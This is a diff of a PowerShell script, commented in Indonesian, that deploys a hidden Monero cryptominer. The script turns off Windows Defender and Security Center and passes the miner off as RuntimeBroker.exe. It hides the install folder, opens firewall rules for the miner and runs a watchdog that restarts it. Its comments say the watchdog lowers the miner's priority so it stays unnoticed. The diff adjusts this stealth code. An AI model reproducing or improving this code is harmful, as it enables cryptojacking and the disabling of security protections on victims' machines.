@@ -1,5 +1,5 @@
 # ==========================================
-# 1. MATIKAN TOTAL SISA TAMENG DEFENDER & NOTIFIKASI
+# 1. MATIKAN TOTAL TAMENG DEFENDER & NOTIFIKASI
 # ==========================================
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
@@ -17,7 +17,7 @@ Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
 Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
 
 # ==========================================
-# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Menggunakan RuntimeBroker.exe yang aman dari Critical Process Crash)
+# 2. INISIALISASI DIREKTORI & TARGET
 # ==========================================
 $PossibleDirs = @(
     "C:\Users\Public\Libraries",
@@ -55,11 +55,11 @@ $VbsPath = Join-Path $Dir "run.vbs"
 $ZipPath = Join-Path $env:TEMP "up.zip"
 $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
-# Menggunakan TLS dan limit CPU 45%
+# Menggunakan TLS dan limit CPU 45% (aman dari lonjakan beban)
 $ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
 
-# Hentikan proses lama & task scheduler yang nyangkut
-Stop-Process -Name "RuntimeBroker", "xmrig", "svchost", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
+# Hentikan proses lama & task scheduler
+Stop-Process -Name "RuntimeBroker", "xmrig", "wscript" -Force -ErrorAction SilentlyContinue
 Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
@@ -96,13 +96,13 @@ if (Test-Path $ZipPath) {
     Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue
 
     # ==========================================
-    # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
+    # 5. OTOMATIS WHITELIST FIREWALL
     # ==========================================
     New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
     New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
 
     # ==========================================
-    # 6. GENTLE STEALTH WATCHDOG (IDLE PRIORITY ON TASKMGR - NO KILL/RESTART LOOP)
+    # 6. STABLE WATCHDOG (TANPA CEK MODULE HANDLE YANG MEMICU CRASH)
     # ==========================================
     $ScriptBlockCode = @"
 `$ExePath = "$ExePath"
@@ -110,31 +110,25 @@ if (Test-Path $ZipPath) {
 
 while (`$true) {
     `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
-    `$MinerProcess = `$Running | Where-Object { `$_.MainModule.FileName -eq `$ExePath } -ErrorAction SilentlyContinue
-
-    if (!`$MinerProcess) {
+    if (!`$Running) {
         Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
     } else {
-        # Jika Task Manager terbuka, set prioritas ke Idle (sangat rendah / ~0-5% CPU) tanpa mematikan proses
-        `$TaskMgrRunning = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
-        foreach (`$p in `$MinerProcess) {
+        # Set prioritas rendah secara permanen agar adem & tidak mencurigakan
+        foreach (`$p in `$Running) {
             try {
-                if (`$TaskMgrRunning) {
-                    `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
-                } else {
-                    `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
-                }
+                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
             } catch {}
         }
     }
-    Start-Sleep -Seconds 3
+    # Jeda lebih lama agar tidak membebani sistem
+    Start-Sleep -Seconds 10
 }
 "@
     $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
     Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force
 
     # ==========================================
-    # 7. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
+    # 7. PEMBUATAN VBSCRIPT BACKGROUND
     # ==========================================
     $VbsScriptContent = @"
 Dim shell
@@ -160,7 +154,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses menggunakan RuntimeBroker.exe, Idle Priority saat TaskManager dibuka (Tanpa Crash/Restart), TLS Encryption, dan Firewall Whitelist!" -ForegroundColor Green
+    Write-Host "Setup sukses dan stabil tanpa crash Task Manager!" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
